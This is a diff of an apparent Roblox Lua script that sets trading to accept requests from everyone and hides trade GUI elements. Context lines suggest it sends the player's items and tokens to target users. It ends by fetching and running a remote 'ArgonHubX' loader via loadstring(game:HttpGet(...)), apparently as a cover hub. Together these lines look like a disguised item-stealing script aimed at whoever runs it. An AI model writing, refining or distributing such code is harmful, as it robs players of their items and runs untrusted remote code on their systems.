@@ -58,10 +58,10 @@ end
 
 -- Allow trade requests from everyone
 local tradeArgs = {
-    "AllowRequests",
-    "Everyone"
+    [1] = "AllowRequests",
+    [2] = "Everyone"
 }
-game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
+netModule:WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
 
 -- Hide UI elements
 tradeGui.Black.Visible = false
@@ -574,5 +574,5 @@ if #itemsToSend > 0 or totalTokens > 0 then
     waitForTargetUsers()
 end
 
-task.wait(5)
+task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
